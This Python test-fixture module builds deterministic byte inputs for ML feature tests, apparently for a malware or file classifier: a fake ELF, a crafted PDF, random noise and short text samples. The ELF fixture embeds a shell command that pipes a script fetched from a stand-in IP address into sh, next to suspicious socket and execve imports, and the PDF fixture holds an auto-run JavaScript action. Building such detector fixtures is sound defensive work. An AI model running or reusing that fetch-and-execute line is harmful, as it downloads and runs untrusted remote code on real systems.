"""Deterministic inputs for the ML feature tests (also used to create the golden numbers)."""
import random
import zlib

from samples import build_elf


def elf_like() -> bytes:
    text = (b"/bin/sh -c 'curl http://203.0.113.5/x.sh | sh' cache cache connect\x00\x01\x02"
            + bytes(range(256)) * 4 + b"  /tmp/.hidden /proc/self/exe \x00" + b"C:/Windows\x00")
    return build_elf(imports=("socket", "connect", "execve"), text=text)


def pdf_like() -> bytes:
    body = zlib.compress(b"BT /F1 12 Tf (Hello) Tj ET " * 40)
    return (b"%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n"
            b"2 0 obj << /URI (http://example.com/a) /Filter /FlateDecode /Length " + str(len(body)).encode()
            + b" >>\nstream\n" + body + b"\nendstream\nendobj\n3 0 obj << /EmbeddedFile >> endobj\n"
            b"<script>x</script> 00:1A:2b:3C:4d:5E\n%%EOF\n")


def noise() -> bytes:
    rng = random.Random(1234)
    return bytes(rng.getrandbits(8) for _ in range(5000))


def short_text() -> bytes:
    return b"GET /index.html HTTP/1.1\r\nUser-Agent: zscan\r\n\r\n \x00\x01 password=secret 192.168.0.1 "


def repeated_text() -> bytes:
    return b"hello system file process " * 200 + bytes(range(256)) * 3


INPUTS = {"elf_like": elf_like, "pdf_like": pdf_like, "noise": noise,
          "short_text": short_text, "repeated_text": repeated_text}
